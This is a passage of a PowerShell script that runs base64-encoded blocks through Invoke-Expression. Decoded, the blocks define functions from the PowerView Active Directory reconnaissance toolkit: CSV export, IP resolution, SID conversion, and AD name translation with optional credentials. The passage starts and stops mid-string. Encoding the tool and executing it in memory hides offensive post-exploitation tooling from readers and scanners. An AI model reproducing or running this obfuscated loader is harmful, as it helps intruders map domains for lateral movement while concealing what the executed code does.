ZXMgPSAkVmFsdWUuc3BsaXQoJywnKSB8IEZvckVhY2gtT2JqZWN0IHsgJF8uVHJpbSgpIH0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snT3V0cHV0T2JqZWN0J10pIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICROYW1lID0gJE5hbWUuUmVwbGFjZSgnICcsICcnKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJEluaU9iamVjdC4kU2VjdGlvbiB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICROYW1lICRWYWx1ZXMKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRJbmlPYmplY3RbJFNlY3Rpb25dWyROYW1lXSA9ICRWYWx1ZXMKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICRJbmlPYmplY3QKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KICAgIEVORCB7CiAgICAgICAgJE1hcHBlZENvbXB1dGVycy5LZXlzIHwgUmVtb3ZlLVJlbW90ZUNvbm5lY3Rpb24KICAgIH0KfQo=")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gRXhwb3J0LVBvd2VyVmlld0NTViB7CiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNTaG91bGRQcm9jZXNzJywgJycpXQogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkVHJ1ZSldCiAgICAgICAgW1N5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNPYmplY3RbXV0KICAgICAgICAkSW5wdXRPYmplY3QsCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkVHJ1ZSwgUG9zaXRpb24gPSAxKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFBhdGgsCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDIpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0NoYXJdCiAgICAgICAgJERlbGltaXRlciA9ICcsJywKICAgICAgICBbU3dpdGNoXQogICAgICAgICRBcHBlbmQKICAgICkKICAgIEJFR0lOIHsKICAgICAgICAkT3V0cHV0UGF0aCA9IFtJTy5QYXRoXTo6R2V0RnVsbFBhdGgoJFBTQm91bmRQYXJhbWV0ZXJzWydQYXRoJ10pCiAgICAgICAgJEV4aXN0cyA9IFtTeXN0ZW0uSU8uRmlsZV06OkV4aXN0cygkT3V0cHV0UGF0aCkKICAgICAgICAkTXV0ZXggPSBOZXctT2JqZWN0IFN5c3RlbS5UaHJlYWRpbmcuTXV0ZXggJEZhbHNlLCdDU1ZNdXRleCcKICAgICAgICAkTnVsbCA9ICRNdXRleC5XYWl0T25lKCkKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydBcHBlbmQnXSkgewogICAgICAgICAgICAkRmlsZU1vZGUgPSBbU3lzdGVtLklPLkZpbGVNb2RlXTo6QXBwZW5kCiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICAkRmlsZU1vZGUgPSBbU3lzdGVtLklPLkZpbGVNb2RlXTo6Q3JlYXRlCiAgICAgICAgICAgICRFeGlzdHMgPSAkRmFsc2UKICAgICAgICB9CiAgICAgICAgJENTVlN0cmVhbSA9IE5ldy1PYmplY3QgSU8uRmlsZVN0cmVhbSgkT3V0cHV0UGF0aCwgJEZpbGVNb2RlLCBbU3lzdGVtLklPLkZpbGVBY2Nlc3NdOjpXcml0ZSwgW0lPLkZpbGVTaGFyZV06OlJlYWQpCiAgICAgICAgJENTVldyaXRlciA9IE5ldy1PYmplY3QgU3lzdGVtLklPLlN0cmVhbVdyaXRlcigkQ1NWU3RyZWFtKQogICAgICAgICRDU1ZXcml0ZXIuQXV0b0ZsdXNoID0gJFRydWUKICAgIH0KICAgIFBST0NFU1MgewogICAgICAgIEZvckVhY2ggKCRFbnRyeSBpbiAkSW5wdXRPYmplY3QpIHsKICAgICAgICAgICAgJE9iamVjdENTViA9IENvbnZlcnRUby1Dc3YgLUlucHV0T2JqZWN0ICRFbnRyeSAtRGVsaW1pdGVyICREZWxpbWl0ZXIgLU5vVHlwZUluZm9ybWF0aW9uCiAgICAgICAgICAgIGlmICgtbm90ICRFeGlzdHMpIHsKICAgICAgICAgICAgICAgICRPYmplY3RDU1YgfCBGb3JFYWNoLU9iamVjdCB7ICRDU1ZXcml0ZXIuV3JpdGVMaW5lKCRfKSB9CiAgICAgICAgICAgICAgICAkRXhpc3RzID0gJFRydWUKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICRPYmplY3RDU1ZbMS4uKCRPYmplY3RDU1YuTGVuZ3RoLTEpXSB8IEZvckVhY2gtT2JqZWN0IHsgJENTVldyaXRlci5Xcml0ZUxpbmUoJF8pIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KICAgIEVORCB7CiAgICAgICAgJE11dGV4LlJlbGVhc2VNdXRleCgpCiAgICAgICAgJENTVldyaXRlci5EaXNwb3NlKCkKICAgICAgICAkQ1NWU3RyZWFtLkRpc3Bvc2UoKQogICAgfQp9Cg==")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gUmVzb2x2ZS1JUEFkZHJlc3MgewogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTU2hvdWxkUHJvY2VzcycsICcnKV0KICAgIFtPdXRwdXRUeXBlKCdTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3VzdG9tT2JqZWN0JyldCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkVHJ1ZSldCiAgICAgICAgW0FsaWFzKCdIb3N0TmFtZScsICdkbnNob3N0bmFtZScsICduYW1lJyldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJENvbXB1dGVyTmFtZSA9ICRFbnY6Q09NUFVURVJOQU1FCiAgICApCiAgICBQUk9DRVNTIHsKICAgICAgICBGb3JFYWNoICgkQ29tcHV0ZXIgaW4gJENvbXB1dGVyTmFtZSkgewogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgQCgoW05ldC5EbnNdOjpHZXRIb3N0RW50cnkoJENvbXB1dGVyKSkuQWRkcmVzc0xpc3QpIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgICAgIGlmICgkXy5BZGRyZXNzRmFtaWx5IC1lcSAnSW50ZXJOZXR3b3JrJykgewogICAgICAgICAgICAgICAgICAgICAgICAkT3V0ID0gTmV3LU9iamVjdCBQU09iamVjdAogICAgICAgICAgICAgICAgICAgICAgICAkT3V0IHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0NvbXB1dGVyTmFtZScgJENvbXB1dGVyCiAgICAgICAgICAgICAgICAgICAgICAgICRPdXQgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnSVBBZGRyZXNzJyAkXy5JUEFkZHJlc3NUb1N0cmluZwogICAgICAgICAgICAgICAgICAgICAgICAkT3V0CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltSZXNvbHZlLUlQQWRkcmVzc10gQ291bGQgbm90IHJlc29sdmUgJENvbXB1dGVyIHRvIGFuIElQIEFkZHJlc3MuIgogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQp9Cg==")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gQ29udmVydFRvLVNJRCB7CiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNTaG91bGRQcm9jZXNzJywgJycpXQogICAgW091dHB1dFR5cGUoW1N0cmluZ10pXQogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkVHJ1ZSldCiAgICAgICAgW0FsaWFzKCdOYW1lJywgJ0lkZW50aXR5JyldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRPYmplY3ROYW1lLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdEb21haW5Db250cm9sbGVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VydmVyLAogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eQogICAgKQogICAgQkVHSU4gewogICAgICAgICREb21haW5TZWFyY2hlckFyZ3VtZW50cyA9IEB7fQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0RvbWFpbiddKSB7ICREb21haW5TZWFyY2hlckFyZ3VtZW50c1snRG9tYWluJ10gPSAkRG9tYWluIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXInXSkgeyAkRG9tYWluU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlciddID0gJFNlcnZlciB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICREb21haW5TZWFyY2hlckFyZ3VtZW50c1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQogICAgfQogICAgUFJPQ0VTUyB7CiAgICAgICAgRm9yRWFjaCAoJE9iamVjdCBpbiAkT2JqZWN0TmFtZSkgewogICAgICAgICAgICAkT2JqZWN0ID0gJE9iamVjdCAtUmVwbGFjZSAnLycsJ1wnCiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgewogICAgICAgICAgICAgICAgJEROID0gQ29udmVydC1BRE5hbWUgLUlkZW50aXR5ICRPYmplY3QgLU91dHB1dFR5cGUgJ0ROJyBARG9tYWluU2VhcmNoZXJBcmd1bWVudHMKICAgICAgICAgICAgICAgIGlmICgkRE4pIHsKICAgICAgICAgICAgICAgICAgICAkVXNlckRvbWFpbiA9ICRETi5TdWJTdHJpbmcoJEROLkluZGV4T2YoJ0RDPScpKSAtcmVwbGFjZSAnREM9JywnJyAtcmVwbGFjZSAnLCcsJy4nCiAgICAgICAgICAgICAgICAgICAgJFVzZXJOYW1lID0gJEROLlNwbGl0KCcsJylbMF0uc3BsaXQoJz0nKVsxXQogICAgICAgICAgICAgICAgICAgICREb21haW5TZWFyY2hlckFyZ3VtZW50c1snSWRlbnRpdHknXSA9ICRVc2VyTmFtZQogICAgICAgICAgICAgICAgICAgICREb21haW5TZWFyY2hlckFyZ3VtZW50c1snRG9tYWluJ10gPSAkVXNlckRvbWFpbgogICAgICAgICAgICAgICAgICAgICREb21haW5TZWFyY2hlckFyZ3VtZW50c1snUHJvcGVydGllcyddID0gJ29iamVjdHNpZCcKICAgICAgICAgICAgICAgICAgICBHZXQtRG9tYWluT2JqZWN0IEBEb21haW5TZWFyY2hlckFyZ3VtZW50cyB8IFNlbGVjdC1PYmplY3QgLUV4cGFuZCBvYmplY3RzaWQKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgaWYgKCRPYmplY3QuQ29udGFpbnMoJ1wnKSkgewogICAgICAgICAgICAgICAgICAgICAgICAkRG9tYWluID0gJE9iamVjdC5TcGxpdCgnXCcpWzBdCiAgICAgICAgICAgICAgICAgICAgICAgICRPYmplY3QgPSAkT2JqZWN0LlNwbGl0KCdcJylbMV0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZWxzZWlmICgtbm90ICRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIHsKICAgICAgICAgICAgICAgICAgICAgICAgJERvbWFpblNlYXJjaGVyQXJndW1lbnRzID0gQHt9CiAgICAgICAgICAgICAgICAgICAgICAgICREb21haW4gPSAoR2V0LURvbWFpbiBARG9tYWluU2VhcmNoZXJBcmd1bWVudHMpLk5hbWUKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgJE9iaiA9IChOZXctT2JqZWN0IFN5c3RlbS5TZWN1cml0eS5QcmluY2lwYWwuTlRBY2NvdW50KCREb21haW4sICRPYmplY3QpKQogICAgICAgICAgICAgICAgICAgICRPYmouVHJhbnNsYXRlKFtTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLlNlY3VyaXR5SWRlbnRpZmllcl0pLlZhbHVlCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0NvbnZlcnRUby1TSURdIEVycm9yIGNvbnZlcnRpbmcgJERvbWFpblwkT2JqZWN0IDogJF8iCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9Cn0K")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gQ29udmVydEZyb20tU0lEIHsKICAgIFtPdXRwdXRUeXBlKFtTdHJpbmddKV0KICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJFRydWUpXQogICAgICAgIFtBbGlhcygnU0lEJyldCiAgICAgICAgW1ZhbGlkYXRlUGF0dGVybignXlMtMS0uKicpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkT2JqZWN0U2lkLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdEb21haW5Db250cm9sbGVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VydmVyLAogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eQogICAgKQogICAgQkVHSU4gewogICAgICAgICRBRE5hbWVBcmd1bWVudHMgPSBAe30KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEb21haW4nXSkgeyAkQUROYW1lQXJndW1lbnRzWydEb21haW4nXSA9ICREb21haW4gfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlciddKSB7ICRBRE5hbWVBcmd1bWVudHNbJ1NlcnZlciddID0gJFNlcnZlciB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRBRE5hbWVBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KICAgIH0KICAgIFBST0NFU1MgewogICAgICAgIEZvckVhY2ggKCRUYXJnZXRTaWQgaW4gJE9iamVjdFNpZCkgewogICAgICAgICAgICAkVGFyZ2V0U2lkID0gJFRhcmdldFNpZC50cmltKCcqJykKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgIFN3aXRjaCAoJFRhcmdldFNpZCkgewogICAgICAgICAgICAgICAgICAgICdTLTEtMCcgICAgICAgICB7ICdOdWxsIEF1dGhvcml0eScgfQogICAgICAgICAgICAgICAgICAgICdTLTEtMC0wJyAgICAgICB7ICdOb2JvZHknIH0KICAgICAgICAgICAgICAgICAgICAnUy0xLTEnICAgICAgICAgeyAnV29ybGQgQXV0aG9yaXR5JyB9CiAgICAgICAgICAgICAgICAgICAgJ1MtMS0xLTAnICAgICAgIHsgJ0V2ZXJ5b25lJyB9CiAgICAgICAgICAgICAgICAgICAgJ1MtMS0yJyAgICAgICAgIHsgJ0xvY2FsIEF1dGhvcml0eScgfQogICAgICAgICAgICAgICAgICAgICdTLTEtMi0wJyAgICAgICB7ICdMb2NhbCcgfQogICAgICAgICAgICAgICAgICAgICdTLTEtMi0xJyAgICAgICB7ICdDb25zb2xlIExvZ29uICcgfQogICAgICAgICAgICAgICAgICAgICdTLTEtMycgICAgICAgICB7ICdDcmVhdG9yIEF1dGhvcml0eScgfQogICAgICAgICAgICAgICAgICAgICdTLTEtMy0wJyAgICAgICB7ICdDcmVhdG9yIE93bmVyJyB9CiAgICAgICAgICAgICAgICAgICAgJ1MtMS0zLTEnICAgICAgIHsgJ0NyZWF0b3IgR3JvdXAnIH0KICAgICAgICAgICAgICAgICAgICAnUy0xLTMtMicgICAgICAgeyAnQ3JlYXRvciBPd25lciBTZXJ2ZXInIH0KICAgICAgICAgICAgICAgICAgICAnUy0xLTMtMycgICAgICAgeyAnQ3JlYXRvciBHcm91cCBTZXJ2ZXInIH0KICAgICAgICAgICAgICAgICAgICAnUy0xLTMtNCcgICAgICAgeyAnT3duZXIgUmlnaHRzJyB9CiAgICAgICAgICAgICAgICAgICAgJ1MtMS00JyAgICAgICAgIHsgJ05vbi11bmlxdWUgQXV0aG9yaXR5JyB9CiAgICAgICAgICAgICAgICAgICAgJ1MtMS01JyAgICAgICAgIHsgJ05UIEF1dGhvcml0eScgfQogICAgICAgICAgICAgICAgICAgICdTLTEtNS0xJyAgICAgICB7ICdEaWFsdXAnIH0KICAgICAgICAgICAgICAgICAgICAnUy0xLTUtMicgICAgICAgeyAnTmV0d29yaycgfQogICAgICAgICAgICAgICAgICAgICdTLTEtNS0zJyAgICAgICB7ICdCYXRjaCcgfQogICAgICAgICAgICAgICAgICAgICdTLTEtNS00JyAgICAgICB7ICdJbnRlcmFjdGl2ZScgfQogICAgICAgICAgICAgICAgICAgICdTLTEtNS02JyAgICAgICB7ICdTZXJ2aWNlJyB9CiAgICAgICAgICAgICAgICAgICAgJ1MtMS01LTcnICAgICAgIHsgJ0Fub255bW91cycgfQogICAgICAgICAgICAgICAgICAgICdTLTEtNS04JyAgICAgICB7ICdQcm94eScgfQogICAgICAgICAgICAgICAgICAgICdTLTEtNS05JyAgICAgICB7ICdFbnRlcnByaXNlIERvbWFpbiBDb250cm9sbGVycycgfQogICAgICAgICAgICAgICAgICAgICdTLTEtNS0xMCcgICAgICB7ICdQcmluY2lwYWwgU2VsZicgfQogICAgICAgICAgICAgICAgICAgICdTLTEtNS0xMScgICAgICB7ICdBdXRoZW50aWNhdGVkIFVzZXJzJyB9CiAgICAgICAgICAgICAgICAgICAgJ1MtMS01LTEyJyAgICAgIHsgJ1Jlc3RyaWN0ZWQgQ29kZScgfQogICAgICAgICAgICAgICAgICAgICdTLTEtNS0xMycgICAgICB7ICdUZXJtaW5hbCBTZXJ2ZXIgVXNlcnMnIH0KICAgICAgICAgICAgICAgICAgICAnUy0xLTUtMTQnICAgICAgeyAnUmVtb3RlIEludGVyYWN0aXZlIExvZ29uJyB9CiAgICAgICAgICAgICAgICAgICAgJ1MtMS01LTE1JyAgICAgIHsgJ1RoaXMgT3JnYW5pemF0aW9uICcgfQogICAgICAgICAgICAgICAgICAgICdTLTEtNS0xNycgICAgICB7ICdUaGlzIE9yZ2FuaXphdGlvbiAnIH0KICAgICAgICAgICAgICAgICAgICAnUy0xLTUtMTgnICAgICAgeyAnTG9jYWwgU3lzdGVtJyB9CiAgICAgICAgICAgICAgICAgICAgJ1MtMS01LTE5JyAgICAgIHsgJ05UIEF1dGhvcml0eScgfQogICAgICAgICAgICAgICAgICAgICdTLTEtNS0yMCcgICAgICB7ICdOVCBBdXRob3JpdHknIH0KICAgICAgICAgICAgICAgICAgICAnUy0xLTUtODAtMCcgICAgeyAnQWxsIFNlcnZpY2VzICcgfQogICAgICAgICAgICAgICAgICAgICdTLTEtNS0zMi01NDQnICB7ICdCVUlMVElOXEFkbWluaXN0cmF0b3JzJyB9CiAgICAgICAgICAgICAgICAgICAgJ1MtMS01LTMyLTU0NScgIHsgJ0JVSUxUSU5cVXNlcnMnIH0KICAgICAgICAgICAgICAgICAgICAnUy0xLTUtMzItNTQ2JyAgeyAnQlVJTFRJTlxHdWVzdHMnIH0KICAgICAgICAgICAgICAgICAgICAnUy0xLTUtMzItNTQ3JyAgeyAnQlVJTFRJTlxQb3dlciBVc2VycycgfQogICAgICAgICAgICAgICAgICAgICdTLTEtNS0zMi01NDgnICB7ICdCVUlMVElOXEFjY291bnQgT3BlcmF0b3JzJyB9CiAgICAgICAgICAgICAgICAgICAgJ1MtMS01LTMyLTU0OScgIHsgJ0JVSUxUSU5cU2VydmVyIE9wZXJhdG9ycycgfQogICAgICAgICAgICAgICAgICAgICdTLTEtNS0zMi01NTAnICB7ICdCVUlMVElOXFByaW50IE9wZXJhdG9ycycgfQogICAgICAgICAgICAgICAgICAgICdTLTEtNS0zMi01NTEnICB7ICdCVUlMVElOXEJhY2t1cCBPcGVyYXRvcnMnIH0KICAgICAgICAgICAgICAgICAgICAnUy0xLTUtMzItNTUyJyAgeyAnQlVJTFRJTlxSZXBsaWNhdG9ycycgfQogICAgICAgICAgICAgICAgICAgICdTLTEtNS0zMi01NTQnICB7ICdCVUlMVElOXFByZS1XaW5kb3dzIDIwMDAgQ29tcGF0aWJsZSBBY2Nlc3MnIH0KICAgICAgICAgICAgICAgICAgICAnUy0xLTUtMzItNTU1JyAgeyAnQlVJTFRJTlxSZW1vdGUgRGVza3RvcCBVc2VycycgfQogICAgICAgICAgICAgICAgICAgICdTLTEtNS0zMi01NTYnICB7ICdCVUlMVElOXE5ldHdvcmsgQ29uZmlndXJhdGlvbiBPcGVyYXRvcnMnIH0KICAgICAgICAgICAgICAgICAgICAnUy0xLTUtMzItNTU3JyAgeyAnQlVJTFRJTlxJbmNvbWluZyBGb3Jlc3QgVHJ1c3QgQnVpbGRlcnMnIH0KICAgICAgICAgICAgICAgICAgICAnUy0xLTUtMzItNTU4JyAgeyAnQlVJTFRJTlxQZXJmb3JtYW5jZSBNb25pdG9yIFVzZXJzJyB9CiAgICAgICAgICAgICAgICAgICAgJ1MtMS01LTMyLTU1OScgIHsgJ0JVSUxUSU5cUGVyZm9ybWFuY2UgTG9nIFVzZXJzJyB9CiAgICAgICAgICAgICAgICAgICAgJ1MtMS01LTMyLTU2MCcgIHsgJ0JVSUxUSU5cV2luZG93cyBBdXRob3JpemF0aW9uIEFjY2VzcyBHcm91cCcgfQogICAgICAgICAgICAgICAgICAgICdTLTEtNS0zMi01NjEnICB7ICdCVUlMVElOXFRlcm1pbmFsIFNlcnZlciBMaWNlbnNlIFNlcnZlcnMnIH0KICAgICAgICAgICAgICAgICAgICAnUy0xLTUtMzItNTYyJyAgeyAnQlVJTFRJTlxEaXN0cmlidXRlZCBDT00gVXNlcnMnIH0KICAgICAgICAgICAgICAgICAgICAnUy0xLTUtMzItNTY5JyAgeyAnQlVJTFRJTlxDcnlwdG9ncmFwaGljIE9wZXJhdG9ycycgfQogICAgICAgICAgICAgICAgICAgICdTLTEtNS0zMi01NzMnICB7ICdCVUlMVElOXEV2ZW50IExvZyBSZWFkZXJzJyB9CiAgICAgICAgICAgICAgICAgICAgJ1MtMS01LTMyLTU3NCcgIHsgJ0JVSUxUSU5cQ2VydGlmaWNhdGUgU2VydmljZSBEQ09NIEFjY2VzcycgfQogICAgICAgICAgICAgICAgICAgICdTLTEtNS0zMi01NzUnICB7ICdCVUlMVElOXFJEUyBSZW1vdGUgQWNjZXNzIFNlcnZlcnMnIH0KICAgICAgICAgICAgICAgICAgICAnUy0xLTUtMzItNTc2JyAgeyAnQlVJTFRJTlxSRFMgRW5kcG9pbnQgU2VydmVycycgfQogICAgICAgICAgICAgICAgICAgICdTLTEtNS0zMi01NzcnICB7ICdCVUlMVElOXFJEUyBNYW5hZ2VtZW50IFNlcnZlcnMnIH0KICAgICAgICAgICAgICAgICAgICAnUy0xLTUtMzItNTc4JyAgeyAnQlVJTFRJTlxIeXBlci1WIEFkbWluaXN0cmF0b3JzJyB9CiAgICAgICAgICAgICAgICAgICAgJ1MtMS01LTMyLTU3OScgIHsgJ0JVSUxUSU5cQWNjZXNzIENvbnRyb2wgQXNzaXN0YW5jZSBPcGVyYXRvcnMnIH0KICAgICAgICAgICAgICAgICAgICAnUy0xLTUtMzItNTgwJyAgeyAnQlVJTFRJTlxBY2Nlc3MgQ29udHJvbCBBc3Npc3RhbmNlIE9wZXJhdG9ycycgfQogICAgICAgICAgICAgICAgICAgIERlZmF1bHQgewogICAgICAgICAgICAgICAgICAgICAgICBDb252ZXJ0LUFETmFtZSAtSWRlbnRpdHkgJFRhcmdldFNpZCBAQUROYW1lQXJndW1lbnRzCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltDb252ZXJ0RnJvbS1TSURdIEVycm9yIGNvbnZlcnRpbmcgU0lEICckVGFyZ2V0U2lkJyA6ICRfIgogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQp9Cg==")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gQ29udmVydC1BRE5hbWUgewogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTVXNlU2hvdWxkUHJvY2Vzc0ZvclN0YXRlQ2hhbmdpbmdGdW5jdGlvbnMnLCAnJyldCiAgICBbT3V0cHV0VHlwZShbU3RyaW5nXSldCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ05hbWUnLCAnT2JqZWN0TmFtZScpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkSWRlbnRpdHksCiAgICAgICAgW1N0cmluZ10KICAgICAgICBbVmFsaWRhdGVTZXQoJ0ROJywgJ0Nhbm9uaWNhbCcsICdOVDQnLCAnRGlzcGxheScsICdEb21haW5TaW1wbGUnLCAnRW50ZXJwcmlzZVNpbXBsZScsICdHVUlEJywgJ1Vua25vd24nLCAnVVBOJywgJ0Nhbm9uaWNhbEV4JywgJ1NQTicpXQogICAgICAgICRPdXRwdXRUeXBlLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdEb21haW5Db250cm9sbGVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VydmVyLAogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eQogICAgKQogICAgQkVHSU4gewogICAgICAgI